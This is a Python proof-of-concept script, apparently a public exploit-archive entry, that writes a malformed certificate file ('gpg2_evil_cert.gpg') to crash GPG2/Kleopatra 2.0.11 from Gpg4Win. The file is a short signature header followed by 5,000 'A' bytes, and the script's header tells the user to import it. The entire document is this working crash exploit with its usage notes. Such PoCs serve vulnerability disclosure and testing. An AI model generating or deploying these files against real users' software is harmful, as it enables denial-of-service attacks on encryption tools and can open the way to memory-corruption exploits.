#!/usr/bin/env python

################################################################
#
# GPG2/Kleopatra 2.0.11 - Malformed Certificate Crash PoC
# Note: 	Part of the GPG4Win Package v2.0.1
# Found By:	Dr_IDE
# Tested On:	7RC, XPSP3
# Usage:	Import the Cert into Kleopatra, GPG2.exe Crashes
#
################################################################

# Seems to only check for the presense of this signature
cert  = ("\x99\x03\x2E\x04\x4A\xDC\xA8\x29\x11\x08\x20");
cert += ("\x41" * 5000);

try:
	print ("[*] Creating evil GPG cert.");
	f1 = open("gpg2_evil_cert.gpg","w");
	f1.write(cert);
	f1.close();
	print ("[*] File created successfully. Import it.");

except:
	print ("[-] Error.");

